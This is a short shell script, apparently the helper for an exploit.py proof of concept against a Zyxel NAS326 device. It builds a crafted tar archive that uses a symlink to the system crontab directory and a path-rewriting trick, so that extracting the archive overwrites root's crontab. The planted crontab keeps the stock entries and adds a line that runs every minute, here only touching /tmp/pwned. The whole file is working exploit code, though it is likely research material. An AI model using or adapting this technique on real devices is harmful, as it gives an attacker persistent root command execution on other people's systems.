# this will be executed on the local machine by exploit.py

rm -rf exploit_dir
rm -f ./magic.tar.gz

mkdir -p exploit_dir/exploit
ln -s /var/spool/cron/crontabs/ exploit_dir/exploit/link

pushd exploit_dir 1>/dev/null

CONTENTS="* * * * * /bin/dsrv-mon.sh > /dev/null 2>&1
17 */2 * * * /bin/rbm.sh by_crond > /dev/null 2>&1
30 01 * * * /bin/backup_webdav_accesslog.sh > /dev/null 2>&1
#*/10 * * * * /usr/bin/ipcam > /dev/null 2>&1
54 18 12 * * /bin/zyfw_downloader ftp://ftp2.zyxel.com/NAS326/firmware FW_INFO.tgz 0 1 > /dev/null 2>&1
54 18 27 * * /bin/zyfw_downloader ftp://ftp2.zyxel.com/NAS326/firmware FW_INFO.tgz 0 1 > /dev/null 2>&1
31 12 * * * /sbin/ntpdate_sync.sh > /dev/null 2>&1
31 0 * * * /sbin/ntpdate_sync.sh > /dev/null 2>&1
29 12 12 */1 * /bin/query_pkglst.sh > /dev/null 2>&1
00 0 2 * * /usr/bin/syslogng_filemgmt.sh > /dev/null 2>&1
* * * * * /usr/bin/syslogng_filemgmt.sh 512000 > /dev/null 2>&1
#Six Hours Check
* */6 * * * /usr/bin/python /usr/local/apache/web_framework/portal/MZCA_Auto_Install.pyc
31 12 12 * * /usr/sbin/dst.sh update CET > /dev/null 2>&1
*/1 * * * * /bin/touch /tmp/pwned
"
echo -ne "$CONTENTS" > ./root
# Create the tar, point ./root to whatever ./exploit/link is pointing to
tar --transform='s!root!./exploit/link/root!' --no-recursion -cvzf ../magic.tar.gz exploit/link root 1>/dev/null

popd 1>/dev/null
